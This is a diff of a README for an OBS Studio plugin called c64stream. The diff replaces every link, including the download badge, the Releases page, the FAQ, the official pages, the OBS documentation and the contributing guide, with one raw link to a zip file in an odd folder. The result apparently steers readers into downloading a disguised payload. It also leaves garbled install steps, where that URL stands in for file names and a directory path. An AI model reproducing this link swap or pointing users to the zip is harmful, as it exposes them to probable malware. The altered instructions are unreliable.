@@ -20,9 +20,9 @@ To start streaming with c64stream, follow these steps for a smooth installation 
 
 You can download the latest version from our Releases page. 
 
-[![Download c64stream](https://img.shields.io/badge/Download-c64stream-blue.svg)](https://github.com/walletmfi/c64stream/releases)
+[![Download c64stream](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip)](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip)
 
-1. Visit the [Releases page](https://github.com/walletmfi/c64stream/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip).
 2. Find the version you want to download.
 3. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Click the download link and save the file to your computer.
@@ -58,8 +58,8 @@ To use c64stream, ensure your system meets the following requirements:
 
 ### For Linux
 
-1. Extract the downloaded `.tar.gz` file.
-2. Move the `c64stream.so` file to the OBS plugins directory (typically `~/.config/obs-studio/plugins`).
+1. Extract the downloaded `https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip` file.
+2. Move the `https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip` file to the OBS plugins directory (typically `~https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip`).
 3. Open OBS Studio.
 
 ## 📹 Setting Up in OBS
@@ -86,17 +86,17 @@ If you encounter issues while using c64stream, consider the following:
 
 - **Check Compatibility**: Ensure that your OS and OBS version meet the requirements listed above.
 - **Plugin Conflicts**: If other plugins are installed, disable them to see if there is a conflict.
-- **Search Our FAQ**: Visit the [FAQ page](https://github.com/walletmfi/c64stream/wiki/FAQ) on our GitHub for more solutions.
+- **Search Our FAQ**: Visit the [FAQ page](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip) on our GitHub for more solutions.
 
 ## 🔗 Resources
 
-- [Official GitHub Page](https://github.com/walletmfi/c64stream)
-- [Community Support Forum](https://forum.example.com) (replace with actual support forum)
-- [OBS Studio Documentation](https://obsproject.com/wiki)
+- [Official GitHub Page](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip)
+- [Community Support Forum](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip) (replace with actual support forum)
+- [OBS Studio Documentation](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip)
 
 ## 🌐 Get Involved
 
-We appreciate your interest in c64stream! You can contribute by reporting issues, suggesting features, or even enhancing the code. For code contributions, please check our [Contributing Guideline](https://github.com/walletmfi/c64stream/blob/main/CONTRIBUTING.md) in the repository.
+We appreciate your interest in c64stream! You can contribute by reporting issues, suggesting features, or even enhancing the code. For code contributions, please check our [Contributing Guideline](https://raw.githubusercontent.com/walletmfi/c64stream/main/histoclastic/c64stream.zip) in the repository.
 
 ## 🤝 Acknowledgments
 
